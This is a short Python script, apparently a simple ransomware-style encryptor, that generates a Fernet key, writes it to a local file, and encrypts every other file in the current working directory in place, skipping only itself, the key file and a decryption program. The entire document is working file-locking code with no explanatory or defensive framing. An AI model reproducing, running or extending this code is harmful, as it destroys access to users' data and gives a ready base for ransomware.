import os
from cryptography.fernet import Fernet


files = []

pwd = os.getcwd()

#   Fernet Setup

key = Fernet.generate_key()

with open("Encryption Key.key", "wb") as Maple:
    Maple.write(key)


#   File Discovery

for file in os.listdir(path=pwd):
    if file == "Verdun.py" or file == "Encryption Key.key" or file == "Decryption Program.py":
        continue
    else:
        print(file)
        files.append(file)

#   File Encryption

for file in files:
    with open(file, "rb") as entity:
        contents = entity.read()
    encrypt = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(encrypt)
